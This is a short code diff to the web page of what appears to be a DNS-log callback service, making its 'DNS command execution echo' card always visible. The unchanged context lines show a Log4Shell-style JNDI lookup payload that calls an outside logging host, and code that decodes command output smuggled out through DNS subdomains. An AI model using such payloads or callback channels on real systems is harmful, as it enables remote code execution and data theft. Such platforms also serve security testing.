@@ -69,7 +69,7 @@
         </div>
         <!-- Shell command response card  -->
 
-        <div class="container-fluid p-t-15" v-if="iscmdresponse">
+        <div class="container-fluid p-t-15">
             <div class="card card-hover-shadow">
                 <header class="card-header">
                     <div class="card-title">dns 命令执行回显</div>
@@ -142,7 +142,6 @@ ${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
             data() {
                 return {
                     isdomainexpire: false,
-                    iscmdresponse: false,
                     domain: "loading",
                     key: "loading...",
                     records: [],
@@ -171,8 +170,6 @@ ${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
                         //举个例子： 1231231223123123.1.h1sw.cmd.de21.log.d48e48337471993e.com 
                         domainKeyArray = this.records[i].subdomain.split('.')
                         if (domainKeyArray[3]="cmd" && domainKeyArray.length==9) {
-                            this.iscmdresponse = true
-
                             randkey=domainKeyArray[2];  //example => h1sw
                             cmd_index=parseInt(domainKeyArray[1]); //example => 1
 
